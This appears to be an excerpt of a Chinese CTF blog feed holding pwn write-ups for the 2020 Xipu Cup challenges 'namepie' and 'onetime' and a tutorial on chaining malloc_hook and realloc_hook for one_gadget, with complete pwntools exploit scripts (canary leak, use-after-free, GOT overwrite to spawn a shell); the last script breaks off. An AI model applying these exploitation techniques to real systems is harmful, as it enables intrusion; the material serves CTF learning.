      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 湖湘杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 西普杯 信息安全铁人三项 第四赛区 Writeup</title>
      <link href="archives/212/"/>
      <url>archives/212/</url>
      
        <content type="html"><![CDATA[<h2 id="namepie"><a href="#namepie" class="headerlink" title="namepie"></a>namepie</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><p>程序有后门：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201108161441.png" alt="image-20201108161441296"></p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>第二次输入栈溢出</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201108161534.png" alt="image-20201108161534336"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>pie 保护 partly write 绕过。</p><p>第一次输入泄露 canary ，第二次覆盖 rip </p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./namepie&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;172.20.14.168&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./namepie&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">name = <span class="string">&#x27;skye&#x27;</span>.ljust(<span class="number">0x30</span>-<span class="number">0x8</span>+<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;skye&#x27;</span>.ljust(<span class="number">0x30</span>-<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>))-<span class="number">0x61</span></span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;\x71&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="onetime"><a href="#onetime" class="headerlink" title="onetime"></a>onetime</h2><h3 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h3><p>堆管理器，有增删查改功能，每个功能只能用一次，还有一个隐藏申请选项，也是只能用一次。</p><p>堆指针、每个功能使用标志位放在 bss 段。</p><p>堆申请大小固定 0x60 ，修改只能修改 0x40 ，但是隐藏申请选项能申请并写入 0x60 字节。</p><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>free 函数 UAF ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201108162257.png" alt="image-20201108162256914"></p><p>还有一点就是每个功能是否使用的判断条件，只要不等于 1 就能运行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( xxxx_inuse == <span class="number">1</span> )</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>UAF 改 fastbin 中 fd 指针到 bss 段，用 bss 上 stdin 的值偏移 3 构造出 size 位 0x7f </li><li>申请堆回来，然后用隐藏申请选项申请出 bss 段的堆，顺便写入 payload （edit 用过一次不能用），将各个标志位覆盖，chunk_ptr 覆盖 atoi@got</li><li>泄露、修改函数地址</li></ol><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./onetime&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./onetime&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;172.20.14.168&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span>(<span class="params">name</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">free()</span><br><span class="line">fill(p64(<span class="number">0x60208d</span>))</span><br><span class="line">add()</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span><span class="comment">#+&#x27;\x00&#x27;*8+p64(0xdeadbeef)</span></span><br><span class="line"><span class="comment">#payload += p64(elf.got[&#x27;free&#x27;]) + p64(0xdeadbeef)*2</span></span><br><span class="line"></span><br><span class="line">hint(payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;data:&quot;</span>)</span><br><span class="line">atoi_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;atoi_addr:&quot;</span>+<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="comment"># fill(&#x27;b&#x27;*8)</span></span><br><span class="line">fill(p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *0x40092D&#x27;)</span></span><br><span class="line">p.send(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 西普杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>realloc_hook 调整栈帧使 onegadget 生效</title>
      <link href="archives/36f80a82/"/>
      <url>archives/36f80a82/</url>
      
        <content type="html"><![CDATA[<p>[scode type=”lblue”]文章首发于<a href="http://www.heetian.com/info/888">合天众智</a>，转载到博客仅作备份[/scode] </p><p>在某些堆的题目当中，由于限制只能使用 house of spirit 等方法劫持 malloc_hook ，这种情况一般是往 malloc_hook 写入 onegadget ，再次申请堆来 getshell 。</p><p>由于栈帧情况不满足，查询到的所有 onegadget 可能都打不通，这时就可以考虑下用 malloc_hook 和 realloc_hook 结合。先通过 realloc 调整栈帧，然后在运行 onegadget 。</p><h2 id="了解-realloc"><a href="#了解-realloc" class="headerlink" title="了解 realloc"></a>了解 realloc</h2><p>realloc 在库函数中的作用是重新调整 malloc 或 calloc 所分配的堆大小。它和 malloc 函数一样有 hook 函数，当 hook 函数不为空时，就会跳转运行 hook 函数（和 malloc_hook 一样的）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">realloc</span><span class="params">(<span class="keyword">signed</span> __int64 a1, <span class="keyword">unsigned</span> __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> ( _realloc_hook )</span><br><span class="line"><span class="keyword">return</span> _realloc_hook(a1, a2, retaddr);</span><br><span class="line">    ……</span><br></pre></td></tr></table></figure><p>看看 realloc 的汇编代码：（可以把 libc 拖到 ida 中看，也可以泄露地址后 gdb 调试查看 <code>x /20i [addr]</code>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000846C0 realloc         proc near               ; DATA XREF: LOAD:0000000000006BA0↑o</span><br><span class="line">.text:00000000000846C0 ; __unwind &#123;</span><br><span class="line">.text:00000000000846C0                 push    r15             ; Alternative name is &#39;__libc_realloc&#39;</span><br><span class="line">.text:00000000000846C2                 push    r14</span><br><span class="line">.text:00000000000846C4                 push    r13</span><br><span class="line">.text:00000000000846C6                 push    r12</span><br><span class="line">.text:00000000000846C8                 mov     r13, rsi</span><br><span class="line">.text:00000000000846CB                 push    rbp</span><br><span class="line">.text:00000000000846CC                 push    rbx</span><br><span class="line">.text:00000000000846CD                 mov     rbx, rdi</span><br><span class="line">.text:00000000000846D0                 sub     rsp, 38h</span><br><span class="line">.text:00000000000846D4                 mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:00000000000846DB                 mov     rax, [rax]</span><br><span class="line">.text:00000000000846DE                 test    rax, rax</span><br><span class="line">.text:00000000000846E1                 jnz     loc_848E8; 跳转执行 realloc_hook</span><br><span class="line">.text:00000000000846E7                 test    rsi, rsi</span><br><span class="line">.text:00000000000846EA                 jnz     short loc_846F5</span><br><span class="line">.text:00000000000846EC                 test    rdi, rdi</span><br><span class="line">.text:00000000000846EF                 jnz     loc_84960</span><br></pre></td></tr></table></figure><p>函数一开始有很多的 push ，realloc 函数先执行 push 压栈，然后在跳转执行 realloc_hook 存储的函数。我们就是利用这些 push 调整栈帧。push 的数量发生变化会影响 rsp 的地址，这样就可以控制 rsp 的取值，从而满足 onegadget 的执行条件。除了可以控制 push 数量，还能通过偏移得到其他的 <code>push xxx</code> 。</p><h2 id="malloc-hook-与-realloc-hook-配合"><a href="#malloc-hook-与-realloc-hook-配合" class="headerlink" title="malloc_hook 与 realloc_hook 配合"></a>malloc_hook 与 realloc_hook 配合</h2><p>将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget ，实际运行顺序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc -&gt; malloc_hook -&gt; realloc -&gt; realloc_hook -&gt; onegadget</span><br></pre></td></tr></table></figure><p>这样就能经过 realloc 调整栈帧后再运行 onegadget 。实际情况中，并不是直接劫持 malloc_hook 为 realloc ，而是要加上一定的偏移，也就是调整 push 的数量，让栈帧结构满足 onegadget 运行。</p><p>realloc 这个偏移做题还是逐个试感觉快一点，因为设想是<strong>少一个 push ，rsp 就会向前移动一个内存单元，对应的 <code>[rsp+0x30]=[rsp+0x38]</code></strong> ，但实际上有少部分位置可能被其他东西写入改变了原来的值。自行调试体会一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 6个push</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /20gx <span class="variable">$rsp</span></span></span><br><span class="line">0x7fffffffdcb8:0x00007ffff7a9195f0x00007fffffffdd20</span><br><span class="line">0x7fffffffdcc8:0x00005555555548e00x00007fffffffde40</span><br><span class="line">0x7fffffffdcd8:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffdce8:0x00007ffff7a43ea00x00007fffffffde40</span><br><span class="line">0x7fffffffdcf8:0x00000000000000000x00007fffffffdd40</span><br><span class="line">0x7fffffffdd08:0x00005555555548e00x00007fffffffde40</span><br><span class="line">0x7fffffffdd18:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffdd28:0x0000555555554b710x00005555555548e0</span><br><span class="line">0x7fffffffdd38:0x00000010000000060x00007fffffffdd60</span><br><span class="line">0x7fffffffdd48:0x0000555555554f860x00007fffffffde40</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 5个push</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /20gx <span class="variable">$rsp</span></span></span><br><span class="line">0x7fffffffdcc0:0x00007ffff7a9195f0x00005555555548e0</span><br><span class="line">0x7fffffffdcd0:0x00007fffffffde400x0000000000000000</span><br><span class="line">0x7fffffffdce0:0x00000000000000000x00007ffff7a43ea0</span><br><span class="line">0x7fffffffdcf0:0x00007fffffffde400x0000555555554a23</span><br><span class="line">0x7fffffffdd00:0x00000000000000000x00007fffffffdd40</span><br><span class="line">0x7fffffffdd10:0x00005555555548e00x00007fffffffde40</span><br><span class="line">0x7fffffffdd20:0x00000000000000000x0000555555554b71</span><br><span class="line">0x7fffffffdd30:0x00005555555548e00x0000001000000006</span><br><span class="line">0x7fffffffdd40:0x00007fffffffdd600x0000555555554f86</span><br><span class="line">0x7fffffffdd50:0x00007fffffffde400x0000000100000000</span><br></pre></td></tr></table></figure><p>原理上是：**少一个 push ，rsp 就会向前移动一个内存单元，对应的 <code>[rsp+0x30]=[rsp+0x38]</code>**，但实际部分位置的值会变，所以逐个试，速度可能比计算快。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="V-amp-N2020-公开赛-simpleHeap"><a href="#V-amp-N2020-公开赛-simpleHeap" class="headerlink" title="[V&amp;N2020 公开赛]simpleHeap"></a>[V&amp;N2020 公开赛]simpleHeap</h3><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>一个基本的堆管理器，有增删查改功能。各项功能都是基于下标序号定位操作，上限为10个堆，大小为大于 0 、小于等于 0x6f 。没有结构体，基于两个列表存储堆信息。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>在修改函数里，调用函数 sub_C39 完成对堆信息的修改。传入的参数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_C39((__int64)chunk_ptr_list[v1], chunk_size_list[v1])</span><br></pre></td></tr></table></figure><p>在处理边界问题时，错误使用判断条件，导致溢出 1 字节，正确应该<code>if(i&gt;=size)</code>，具体逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_C39</span><span class="params">(__int64 ptr, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; size )                             <span class="comment">// off by one</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + ptr), <span class="number">1uLL</span>) )    <span class="comment">// 输出错误的异常处理</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + ptr) == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = i + ptr;</span><br><span class="line">      *(_BYTE *)result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>使用 off by one 伪造 chunk size，造成 chunk extend ，再利用 unsorted bin 的特点，泄露出 unsorted bin fd 指针的 libc 地址。</p><p>将上一步中的 chunk extend 剩下在 bin 中的内存申请出来，造成两个指针指向同一个地址，配合 edit 功能实现 houst of spirit ，劫持 __malloc_hook 。</p><p>实际测试后全部 onegadget 因为栈环境问题都无法打通，需要结合 malloc_hook 、 realloc_hook 调整栈环境才能打通。</p><hr><p>溢出修改 chunk size 造成 chunk extend ，chunk0 用于溢出 chunk1 ，chunk2 用于读取 unsorted bin fd 指针，chunk3 防止 fake chunk 与 topchunk 合并。溢出 size 是经过计算符合 house of spirit 要求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;y&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\xc1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">&#x27;yyds&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>泄露 libc 地址后，将 bin 中剩余内存申请出来，该指针与 chunk2 指向相同地址，任选其一释放，再用另外一个修改 fastbin fd 指针：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;skye&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br></pre></td></tr></table></figure><p>正常来说将 malloc_hook 劫持为 onegadget 即可，但是测试发现这条题目的栈环境不满足全部 onegadget 条件，这就需要调整阵结构，使 onegadget 生效。<strong>需要配合使用 realloc_hook 和 malloc_hook。</strong></p><p>将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget 。然后通过多次尝试确定偏移为 12 。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./vn_pwn_simpleHeap&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node3.buuoj.cn&quot;,29864)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vn_pwn_simpleHeap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;y&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\xc1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">&#x27;yyds&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;skye&#x27;</span>)<span 